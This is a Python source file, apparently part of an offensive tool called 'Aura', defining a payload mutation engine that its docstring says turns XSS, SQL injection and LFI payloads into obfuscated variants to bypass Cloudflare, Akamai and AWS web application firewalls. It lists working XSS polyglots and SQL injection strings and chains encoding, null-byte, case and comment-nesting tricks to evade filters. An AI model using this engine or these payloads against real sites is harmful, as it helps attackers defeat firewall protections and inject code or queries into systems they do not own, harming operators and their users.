import random
import urllib.parse
from rich.console import Console

from aura.ui.formatter import console

class NeuralForge:
    """
    Aura v15: Neural Forge Mutation Engine.
    Dynamically mutates standard payloads (XSS, SQLi, LFI) into hundreds
    of obfuscated variations to bypass Cloudflare, Akamai, and AWS WAFs.
    """
    def __init__(self):
        self.mutations = [
            self._url_encode,
            self._double_url_encode,
            self._unicode_escape,
            self._hex_encode,
            self._case_randomize,
            self._null_byte_inject,
            self._html_entity_encode,
            self._tab_separation,
            self._comment_nesting,
            self._junk_data
        ]

    # --- Mutation Strategies ---
    def _url_encode(self, payload: str) -> str:
        return urllib.parse.quote(payload)

    def _double_url_encode(self, payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload))

    def _unicode_escape(self, payload: str) -> str:
        return payload.encode("unicode_escape").decode("utf-8")

    def _hex_encode(self, payload: str) -> str:
        return "".join(f"%{hex(ord(c))[2:]}" for c in payload)

    def _case_randomize(self, payload: str) -> str:
        return "".join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)

    def _null_byte_inject(self, payload: str) -> str:
        # Inject %00 in safe places (e.g., before tags)
        if "<" in payload:
            return payload.replace("<", "%00<")
        return payload + "%00"

    def _html_entity_encode(self, payload: str) -> str:
        return "".join(f"&#x{hex(ord(c))[2:]};" for c in payload)

    def _tab_separation(self, payload: str) -> str:
        return payload.replace(" ", "%09")

    def _comment_nesting(self, payload: str) -> str:
        # Nest SQL comments or similar
        return payload.replace(" ", "/**/")

    def _junk_data(self, payload: str) -> str:
        # Append junk data to bypass some length-based filters
        import random as _rnd
        junk = f"&ignore={_rnd.getrandbits(32)}"
        return payload + junk

    # --- Main Engine ---
    def forge_payloads(self, base_payload: str, max_variations: int = 20) -> list[str]:
        """
        Takes a base payload (e.g., "<script>alert(1)</script>") and
        returns a list of heavily mutated variations.
        """
        forged = set([base_payload])
        
        # Apply single mutations
        for mutator in self.mutations:
            try:
                forged.add(mutator(base_payload))
            except: pass
            
        # Apply stacked mutations (Mutation Chaining)
        chained_attempts = 0
        while len(forged) < max_variations and chained_attempts < 50:
            chained_attempts += 1
            payload_to_mutate = random.choice(list(forged))
            mutator = random.choice(self.mutations)
            try:
                new_payload = mutator(payload_to_mutate)
                # Keep payload size reasonable
                if len(new_payload) < len(base_payload) * 4:
                    forged.add(new_payload)
            except: pass

        return list(forged)[:max_variations]

    def get_xss_polyglots(self) -> list[str]:
        """Returns heavily obfuscated XSS polyglots designed to bypass WAFs."""
        base_polyglots = [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ]
        
        all_payloads = []
        for bp in base_polyglots:
            all_payloads.extend(self.forge_payloads(bp, max_variations=5))
            
        return list(set(all_payloads))
        
    def get_sqli_polyglots(self) -> list[str]:
        """Returns obfuscated SQLi payloads."""
        base_polyglots = [
            "' OR 1=1--",
            "1' ORDER BY 1--+",
            "1' UNION SELECT NULL,NULL--",
            "1 WAITFOR DELAY '0:0:5'--"
        ]
        
        all_payloads = []
        for bp in base_polyglots:
            all_payloads.extend(self.forge_payloads(bp, max_variations=5))
            
        return list(set(all_payloads))

    def apply_strategy(self, payload: str, strategy: str) -> str:
        """Applies a specific mutation strategy based on AI/Heuristic advice."""
        strategy = strategy.lower()
        if "double" in strategy:
            return self._double_url_encode(payload)
        if "unicode" in strategy:
            return self._unicode_escape(payload)
        if "hex" in strategy:
            return self._hex_encode(payload)
        if "null" in strategy:
            return self._null_byte_inject(payload)
        if "comment" in strategy:
            return self._comment_nesting(payload)
        if "junk" in strategy:
            return self._junk_data(payload)
        return self._url_encode(payload)
